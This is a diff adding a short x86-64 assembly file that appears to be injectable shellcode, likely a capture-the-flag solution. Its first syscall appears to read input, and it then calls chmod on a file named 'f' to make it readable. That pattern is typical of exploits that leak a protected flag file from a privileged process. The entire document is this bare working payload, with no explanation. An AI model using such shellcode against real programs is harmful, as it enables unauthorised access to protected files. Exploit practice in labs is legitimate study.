@@ -1,0 +1,12 @@
+.global _start
+_start:
+.intel_syntax noprefix
+xchg esi, edx
+xor edi, edi
+syscall
+push 0x66
+push 0x66
+mov rdi, rsp
+mov rsi, 0x4
+mov rax, 0x5a
+syscall
